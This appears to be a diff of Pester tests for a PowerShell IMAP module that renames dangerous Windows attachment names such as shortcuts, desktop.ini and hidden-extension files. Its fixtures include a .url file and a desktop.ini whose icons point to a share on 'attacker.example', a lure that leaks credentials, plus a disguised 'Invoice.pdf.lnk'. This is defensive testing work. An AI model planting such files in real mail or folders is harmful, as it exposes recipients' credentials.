@@ -125,6 +125,7 @@ Describe 'The file of an attachment' {
         @{ Case = 'a device name with a digit of another script'; Name = "COM`u{663}.txt"; Expected = "_COM`u{663}.txt" }
         @{ Case = 'a name written decomposed, as macOS writes names'; Name = "relato`u{301}rio.pdf"; Expected = "relat`u{F3}rio.pdf" }
         @{ Case = 'a lone surrogate'; Name = 'x' + [char]0xD800 + 'y.pdf'; Expected = 'x_y.pdf' }
+        @{ Case = 'U+FFFE, which Normalize refuses too'; Name = 'invoice' + [char]0xFFFE + '.exe'; ContentType = 'application/octet-stream'; Expected = 'invoice_.exe' }
         @{ Case = 'a control character of the C1 set (CSI)'; Name = "a`u{9B}b.txt"; Expected = 'a_b.txt' }
         @{ Case = 'the Arabic letter mark, which only turns digits around, and is invisible'; Name = "a`u{61C}b.txt"; Expected = 'ab.txt' }
         @{ Case = 'a soft hyphen and a zero-width space, which are invisible'; Name = "re`u{AD}po`u{200B}rt.pdf"; Expected = 'report.pdf' }
@@ -134,23 +135,46 @@ Describe 'The file of an attachment' {
         @{ Case = 'another short name, without an extension'; Name = 'progr~12'; Expected = 'progr_12' }
         @{ Case = 'a tilde in a name no short name has'; Name = 'report~1.docx'; Expected = 'report~1.docx' }
         @{ Case = 'the lock file of an Office document'; Name = '~$budget.xlsx'; Expected = '~$budget.xlsx' }
+        @{ Case = 'the file that customizes a folder'; Name = 'desktop.ini'; Expected = '_desktop.ini' }
+        @{ Case = 'the thumbnails of a folder, in capitals'; Name = 'THUMBS.DB'; Expected = '_THUMBS.DB' }
+        @{ Case = 'a name that only has desktop.ini in it'; Name = 'my desktop.ini.txt'; Expected = 'my desktop.ini.txt' }
+        @{ Case = 'a shortcut, whose extension Explorer hides'; Name = 'Invoice.pdf.lnk'; Expected = 'Invoice.pdf.lnk.download' }
+        @{ Case = 'a shortcut to a site, in capitals'; Name = 'Invoice.URL'; Expected = 'Invoice.URL.download' }
+        @{ Case = 'a program behind an extension Explorer hides'; Name = 'Invoice.pdf.pif'; Expected = 'Invoice.pdf.pif.download' }
+        @{ Case = 'a command file of the shell'; Name = 'x.scf'; Expected = 'x.scf.download' }
+        @{ Case = 'a library of Windows'; Name = 'report.library-ms'; Expected = 'report.library-ms.download' }
+        @{ Case = 'a search connector'; Name = 'x.searchConnector-ms'; Expected = 'x.searchConnector-ms.download' }
+        @{ Case = 'a file that redirects the libraries of a program'; Name = 'app.exe.local'; Expected = 'app.exe.local.download' }
+        @{ Case = 'the file of settings of a project, which redirects nothing'; Name = '.env.local'; Expected = '.env.local' }
+        @{ Case = 'an extension that is a class of the shell'; Name = 'x.{645FF040-5081-101B-9F08-00AA002F954E}'; Expected = 'x.{645FF040-5081-101B-9F08-00AA002F954E}.download' }
+        @{ Case = 'a shortcut with dots and spaces at the end'; Name = 'Invoice.lnk. '; Expected = 'Invoice.lnk.download' }
+        @{ Case = 'an extension of the shell before the last one'; Name = 'notes.lnk.txt'; Expected = 'notes.lnk.txt' }
+        @{ Case = 'a long name of a shortcut, cut first'; Name = ('x' * 300) + '.lnk'; Expected = ('x' * 196) + '.lnk.download' }
     ) {
         $fileName = Get-FileName $Name $ContentType
         # -ceq takes a name and its decomposed form for equal: compared character for character
         [string]::Equals($fileName, $Expected, [StringComparison]::Ordinal) | Should -BeTrue -Because "'$fileName' should be '$Expected'"
     }
 
+    # Those whose extension Explorer hides even when it shows the others (NeverShowExt, measured on Windows 11)
+    It 'renames a file of each type whose extension Explorer hides' {
+        $extensions = 'lnk', 'url', 'pif', 'scf', 'website', 'appref-ms', 'library-ms', 'search-ms', 'searchConnector-ms', 'accountpicture-ms', 'desklink', 'mapimail', 'mydocs', 'zfsendtotarget'
+        $fileNames = foreach ($extension in $extensions) { Get-FileName "Invoice.pdf.$extension" }
+
+        $fileNames | Should -BeExactly @($extensions | ForEach-Object { "Invoice.pdf.$_.download" })
+    }
+
     # In Turkish, "I" is not the capital of "i": a device name in small letters is a device name all the same
-    It 'tells a device name alike in the Turkish culture' {
+    It 'tells a device name, and a name the shell acts on, alike in the Turkish culture' {
         $culture = [Threading.Thread]::CurrentThread.CurrentCulture
         try {
             [Threading.Thread]::CurrentThread.CurrentCulture = 'tr-TR'
-            $fileName = Get-FileName 'conin$'
+            $fileNames = foreach ($name in 'conin$', 'DESKTOP.INI', 'X.PIF', 'REPORT.LIBRARY-MS') { Get-FileName $name }
         } finally {
             [Threading.Thread]::CurrentThread.CurrentCulture = $culture
         }
 
-        $fileName | Should -BeExactly '_conin$'
+        $fileNames | Should -BeExactly '_conin$', '_DESKTOP.INI', 'X.PIF.download', 'REPORT.LIBRARY-MS.download'
     }
 
     It 'numbers a name that comes again in the same message, keeping its extension' {
@@ -255,6 +279,7 @@ Describe 'The file of a message, and the directory of every file' {
         @{ Case = 'an escape sequence'; Uid = 12; Subject = "Hi`e[2J"; Expected = '12-Hi_[2J.eml' }
         @{ Case = 'a device name of Windows'; Uid = 13; Subject = 'CON'; Expected = '13-CON.eml' }
         @{ Case = 'a long subject, cut to 200 bytes before the extension'; Uid = 14; Subject = 'x' * 300; Expected = '14-' + ('x' * 193) + '.eml' }
+        @{ Case = 'U+FFFE in the subject, which Normalize refuses'; Uid = 15; Subject = 'Proposal' + [char]0xFFFE + ' 2027'; Expected = '15-Proposal_ 2027.eml' }
     ) {
         $fileName = InModuleScope ElektoImapPosh -Parameters @{ Uid = $Uid; Subject = $Subject } { param($Uid, $Subject) Get-MessageFileName $Uid $Subject }
 
@@ -400,11 +425,33 @@ Describe 'Save-ImapAttachment on Gmail' {
                     @{ Name = ''; Type = 'application/pdf'; Data = '%PDF nameless'; Disposition = 'inline' }
                 )
             }
+            # Files the shell of Windows acts on by their look alone: a shortcut to a site and a desktop.ini whose icons
+            # are on a server of the sender's, and a shortcut whose hidden extension leaves "Invoice.pdf" in sight
+            @{ Uid = 32; Folders = 'INBOX', '[Gmail]/All Mail'; Labels = @('\Inbox'); From = 'Client <client@client.example>'; Subject = 'Shell names'; Date = $now.AddSeconds(-5); Size = 9000; AuthenticationResults = $client
+                Attachments = @(
+                    @{ Name = 'Invoice.url'; Type = 'application/octet-stream'; Data = "[InternetShortcut]`r`nURL=https://client.example/`r`nIconFile=\\attacker.example\share\icon.ico`r`n" }
+                    @{ Name = 'desktop.ini'; Type = 'application/octet-stream'; Data = "[.ShellClassInfo]`r`nIconResource=\\attacker.example\share\icon.ico,0`r`n" }
+                    @{ Name = 'Invoice.pdf.lnk'; Type = 'application/octet-stream'; Data = 'L shortcut' }
+                    @{ Name = 'notes.lnk.txt'; Type = 'text/plain'; Data = 'notes' }
+                )
+            }
+            # A name with U+FFFE, which Normalize refuses, as an encoded word of RFC 2047 brings it in plain ASCII
+            @{ Uid = 33; Folders = 'INBOX', '[Gmail]/All Mail'; Labels = @('\Inbox'); From = 'Client <client@client.example>'; Subject = 'Refused character'; Date = $now.AddSeconds(-4); Size = 9000; AuthenticationResults = $client
+                Attachments = @(@{ Name = '=?utf-8?B?cmXvv75wb3J0LnBkZg==?='; Type = 'application/pdf'; Data = '%PDF refused' })
+            }
+            # Empty files, an export with no rows and an empty log, in base64 and as they are, and a file after them
+            @{ Uid = 34; Folders = 'INBOX', '[Gmail]/All Mail'; Labels = @('\Inbox'); From = 'Client <client@client.example>'; Subject = 'Empty files'; Date = $now.AddSeconds(-3); Size = 9000; AuthenticationResults = $client
+                Attachments = @(
+                    @{ Name = 'export.csv'; Type = 'text/csv'; Data = '' }
+                    @{ Name = 'empty.log'; Type = 'application/octet-stream'; Encoding = '7bit'; Data = '' }
+                    @{ Name = 'after.txt'; Type = 'text/plain'; Encoding = '7bit'; Data = 'after' }
+                )
+            }
         )
         $server = Start-FakeGmail $messages
         # Another server, where the account "elsewhere" finds the same user, folder, UIDVALIDITY and UID 10
         $elsewhere = Start-FakeGmail @($messages | Where-Object { $_.Uid -eq 10 })
-        $passwords = Set-TestAccount 'gmail-attachments' $server.Port -SavedEnvironment $savedEnvironment -Accounts @{ open = @{}; strict = @{ Policy = 'strict' }; one = @{ Policy = 'one' }; pdf = @{ Policy = 'pdf' }; prefixed = @{ Policy = 'prefixed' }; exact = @{ Policy = 'exact' }; named = @{ Policy = 'named' }; accents = @{ Policy = 'accents' }; small = @{ Policy = 'small' }; zip = @{ Policy = 'zip' }; elsewhere = @{ Port = $elsewhere.Port; Policy = 'pdf' } } -Policies @{
+        $passwords = Set-TestAccount 'gmail-attachments' $server.Port -SavedEnvironment $savedEnvironment -Accounts @{ open = @{}; strict = @{ Policy = 'strict' }; one = @{ Policy = 'one' }; pdf = @{ Policy = 'pdf' }; prefixed = @{ Policy = 'prefixed' }; exact = @{ Policy = 'exact' }; named = @{ Policy = 'named' }; accents = @{ Policy = 'accents' }; small = @{ Policy = 'small' }; zip = @{ Policy = 'zip' }; shell = @{ Policy = 'shell' }; elsewhere = @{ Port = $elsewhere.Port; Policy = 'pdf' } } -Policies @{
             strict = @{
                 DenyFolders                = @('Finance/*')
                 AllowAttachmentsFrom       = @('*@client.example', 'me@gmail.com')
@@ -422,6 +469,7 @@ Describe 'Save-ImapAttachment on Gmail' {
             accents  = @{ DenyAttachmentTypes = @("*relato`u{301}rio*") }
             small    = @{ MaxAttachmentSize = 1000 }
             zip      = @{ DenyAttachmentTypes = @('*.zip') }
+            shell    = @{ DenyAttachmentTypes = @('*.url', 'desktop.ini') }
         }
 
         # A new directory of the test drive for each test, and the commands the server got since the test began
@@ -622,6 +670,48 @@ Describe 'Save-ImapAttachment on Gmail' {
         $files.DirectoryName | Sort-Object -Unique | Should -Be $directory
         Test-Path -LiteralPath (Join-Path $TestDrive 'escaped.txt') | Should -BeFalse
         [IO.File]::ReadAllText((Join-Path $directory 'invoice.exe')) | Should -BeExactly 'MZ program'
+    }
+
+    It 'saves the files the shell of Windows acts on under names it does not act on, and lists them so' {
+        $directory = New-TestDirectory 'shell'
+        $files = Save-ImapAttachment open -Folder All -Uid 32 -Path $directory -ErrorVariable failures
+        $listed = (Read-ImapMessage open -Folder All -Uid 32).Attachments
+
+        $failures | Should -BeNullOrEmpty
+        $files.Name | Should -BeExactly 'Invoice.url.download', '_desktop.ini', 'Invoice.pdf.lnk.download', 'notes.lnk.txt'
+        $files.Attachment | Should -BeExactly 'Invoice.url', 'desktop.ini', 'Invoice.pdf.lnk', 'notes.lnk.txt'
+        [IO.File]::ReadAllText((Join-Path $directory '_desktop.ini')) | Should -BeLike '`[.ShellClassInfo`]*'
+        @(Get-ChildItem -LiteralPath $directory -Force).Name | Sort-Object | Should -BeExactly '_desktop.ini', 'Invoice.pdf.lnk.download', 'Invoice.url.download', 'notes.lnk.txt'
+        $listed.Name | Should -BeExactly 'Invoice.url', 'desktop.ini', 'Invoice.pdf.lnk', 'notes.lnk.txt'
+        $listed.FileName | Should -BeExactly 'Invoice.url.download', '_desktop.ini', 'Invoice.pdf.lnk.download', 'notes.lnk.txt'
+    }
+
+    It 'holds to the policy the name that a file the shell acts on had before it was renamed' {
+        $files = Save-ImapAttachment shell -Folder All -Uid 32 -Path (New-TestDirectory 'shell-policy') -ErrorVariable failures -ErrorAction SilentlyContinue
+
+        $files.Name | Should -BeExactly 'Invoice.pdf.lnk.download', 'notes.lnk.txt'
+        $failures.FullyQualifiedErrorId | Should -Be 'AttachmentWithheld,Save-ImapAttachment', 'AttachmentWithheld,Save-ImapAttachment'
+        "$($failures[0])" | Should -BeLike "*'Invoice.url'*matches '`*.url' in DenyAttachmentTypes*"
+        "$($failures[1])" | Should -BeLike "*'desktop.ini'*matches 'desktop.ini' in DenyAttachmentTypes*"
+    }
+
+    It 'names a file whose name has a character that Normalize refuses, with no error' {
+        $files = Save-ImapAttachment open -Folder All -Uid 33 -Path (New-TestDirectory 'refused') -ErrorVariable failures
+        $listed = (Read-ImapMessage open -Folder All -Uid 33 -ErrorVariable readFailures).Attachments
+
+        @($failures) + @($readFailures) | Should -BeNullOrEmpty
+        $files.Name | Should -BeExactly 're_port.pdf'
+        $listed.Name | Should -BeExactly ('re' + [char]0xFFFE + 'port.pdf')
+        $listed.FileName | Should -BeExactly 're_port.pdf'
+    }
+
+    It 'saves an empty file, and each empty file of a message, with no error' {
+        $files = Save-ImapAttachment open -Folder All -Uid 34 -Path (New-TestDirectory 'empty') -ErrorVariable failures
+
+        $failures | Should -BeNullOrEmpty
+        $files.Name | Should -BeExactly 'export.csv', 'empty.log', 'after.txt'
+        # Of each file: Length of the array would be its count
+        $files | ForEach-Object { $_.Length } | Should -Be 0, 0, 5
     }
 
     It 'saves nothing, and fetches no attachment, with -WhatIf' {
